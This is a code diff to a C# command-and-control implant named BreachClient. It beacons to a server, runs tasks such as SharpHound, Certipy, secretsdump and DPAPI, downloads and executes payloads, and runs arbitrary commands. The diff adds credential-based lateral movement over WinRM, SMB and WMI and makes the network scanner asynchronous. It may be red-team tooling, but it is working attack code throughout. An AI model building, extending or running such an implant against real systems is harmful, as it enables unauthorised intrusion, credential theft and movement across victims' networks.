@@ -17,7 +17,7 @@ namespace BreachClient
     {
         private static readonly HttpClient http = new HttpClient();
         private static readonly string ServerId = "http://192.168.10.4:8080";
-        private static readonly string AgentId = Guid.NewGuid().ToString();
+        private static readonly string AgentId = "AGENT_001"; // Set this before compiling — must be unique per target
         private static readonly int BeaconInterval = 5000; // ms
 
         static async Task Main(string[] args)
@@ -75,12 +75,13 @@ namespace BreachClient
 
                 string output = taskType switch
                 {
-                    "recon"       => await RunRecon(instruction),
-                    "sharphound"  => await RunSharpHound(instruction),
-                    "certipy"     => await RunCertipy(instruction),
-                    "secretsdump" => await RunDownloadAndExec(instruction),
-                    "dpapi"       => await RunDownloadAndExec(instruction),
-                    _             => ExecuteCommand(instruction)
+                    "recon"        => await RunRecon(instruction),
+                    "sharphound"   => await RunSharpHound(instruction),
+                    "certipy"      => await RunCertipy(instruction),
+                    "secretsdump"  => await RunDownloadAndExec(instruction),
+                    "dpapi"        => await RunDownloadAndExec(instruction),
+                    "authenticate" => RunAuthenticate(instruction),
+                    _              => ExecuteCommand(instruction)
                 };
 
                 await PostResult(taskId, output);
@@ -319,6 +320,63 @@ namespace BreachClient
             }
         }
 
+        // ── Authentication / lateral movement ────────────────────────────────────
+
+        /// <summary>
+        /// Authenticate to a remote host using a native Windows service.
+        /// Instruction format: "username|password|target|service"
+        /// Services: winrm (winrs), smb (net use), wmi (wmic)
+        /// </summary>
+        static string RunAuthenticate(string instruction)
+        {
+            var parts = instruction.Split('|');
+            if (parts.Length < 4)
+                return "[error] Invalid authenticate instruction — expected: user|password|target|service";
+
+            string username = parts[0];
+            string password = parts[1];
+            string target   = parts[2];
+            string service  = parts[3].ToLower();
+
+            return service switch
+            {
+                "smb" => RunSmbAuth(username, password, target),
+                "wmi" => RunWmiAuth(username, password, target),
+                _     => RunWinrmAuth(username, password, target)
+            };
+        }
+
+        /// <summary>WinRM — run a remote command via winrs and return its output.</summary>
+        static string RunWinrmAuth(string username, string password, string target)
+        {
+            return ExecuteCommand(
+                $"winrs -r:http://{target}:5985 -u:{username} -p:{password} cmd /c \"whoami && hostname && ipconfig\""
+            );
+        }
+
+        /// <summary>SMB — authenticate via IPC$ and list shares, then clean up the session.</summary>
+        static string RunSmbAuth(string username, string password, string target)
+        {
+            string connect = ExecuteCommand($"net use \\\\{target}\\IPC$ \"{password}\" /user:{username}");
+
+            if (connect.Contains("error", StringComparison.OrdinalIgnoreCase) ||
+                connect.Contains("Access is denied", StringComparison.OrdinalIgnoreCase))
+                return connect.Trim();
+
+            string shares = ExecuteCommand($"net view \\\\{target}");
+            ExecuteCommand($"net use \\\\{target}\\IPC$ /delete /yes");
+
+            return connect.Trim() + "\n" + shares.Trim();
+        }
+
+        /// <summary>WMI — list remote processes to prove authenticated access.</summary>
+        static string RunWmiAuth(string username, string password, string target)
+        {
+            return ExecuteCommand(
+                $"wmic /node:{target} /user:{username} /password:\"{password}\" process list brief"
+            );
+        }
+
         // ── Lateral movement (disabled — re-enable when BH integration is ready) ──
         //
         // static async Task<string> RunLateralMovement(string instruction)
@@ -350,17 +408,19 @@ namespace BreachClient
                 .Select(x => x.ip)
                 .ToList();
 
-            // Scan alive hosts in parallel: hostname + port/service/banner
-            var hosts = aliveHosts.AsParallel().Select(ip =>
+            // Scan alive hosts in parallel (fully async — no blocking threads)
+            var hostTasks = aliveHosts.Select(async ip =>
             {
-                string hostname = ResolveHostname(ip);
-                var ports = CommonPorts
-                    .Select(p => ScanPort(ip, p))
+                string hostname = await ResolveHostnameAsync(ip);
+                var portTasks   = CommonPorts.Select(p => ScanPortAsync(ip, p));
+                var portResults = await Task.WhenAll(portTasks);
+                var ports = portResults
                     .Where(r => r.HasValue)
                     .Select(r => new { port = r!.Value.port, service = r.Value.service, banner = r.Value.banner })
                     .ToList();
                 return new { ip, hostname, ports };
-            }).ToList();
+            });
+            var hosts = await Task.WhenAll(hostTasks);
 
             string json = JsonSerializer.Serialize(new { target, hosts });
 
@@ -380,51 +440,50 @@ namespace BreachClient
             return json;
         }
 
-        static string ResolveHostname(string ip)
+        static async Task<string> ResolveHostnameAsync(string ip)
         {
             try
             {
-                var entry = Dns.GetHostEntry(ip);
+                using var cts = new System.Threading.CancellationTokenSource(2000);
+                var entry = await Dns.GetHostEntryAsync(ip, cts.Token);
                 return entry.HostName;
             }
             catch { return ""; }
         }
 
-        static (int port, string service, string banner)? ScanPort(string ip, int port)
+        static async Task<(int port, string service, string banner)?> ScanPortAsync(string ip, int port)
         {
             try
             {
                 using var tcp = new TcpClient();
-                var ar = tcp.BeginConnect(ip, port, null, null);
-                if (!ar.AsyncWaitHandle.WaitOne(PortTimeout)) return null;
-                try { tcp.EndConnect(ar); } catch { return null; }
+                using var cts = new System.Threading.CancellationTokenSource(PortTimeout);
+                await tcp.ConnectAsync(ip, port, cts.Token);
 
-                string banner  = GrabBanner(tcp, ip, port);
+                string banner  = await GrabBannerAsync(tcp, ip, port);
                 string service = GetServiceName(port, banner);
                 return (port, service, banner);
             }
             catch { return null; }
         }
 
-        static string GrabBanner(TcpClient tcp, string ip, int port)
+        static async Task<string> GrabBannerAsync(TcpClient tcp, string ip, int port)
         {
             // Skip banner grab for binary/SSL protocols
             if (port == 135 || port == 139 || port == 443 || port == 3389 || port == 5986 || port == 8443)
                 return "";
             try
             {
-                tcp.ReceiveTimeout = BannerTimeout;
-                var stream = tcp.GetStream();
-                stream.WriteTimeout = BannerTimeout;
+                using var cts    = new System.Threading.CancellationTokenSource(BannerTimeout);
+                var stream       = tcp.GetStream();
 
                 if (port == 80 || port == 8080)
                 {
                     var req = Encoding.ASCII.GetBytes($"HEAD / HTTP/1.0\r\nHost: {ip}\r\n\r\n");
-                    stream.Write(req, 0, req.Length);
+                    await stream.WriteAsync(req, cts.Token);
                 }
 
                 var buf = new byte[512];
-                int n = stream.Read(buf, 0, buf.Length);
+                int n = await stream.ReadAsync(buf, cts.Token);
                 return new string(Encoding.ASCII.GetString(buf, 0, n)
                     .Where(c => c >= 32 || c == '\n' || c == '\r')
                     .ToArray()).Trim();
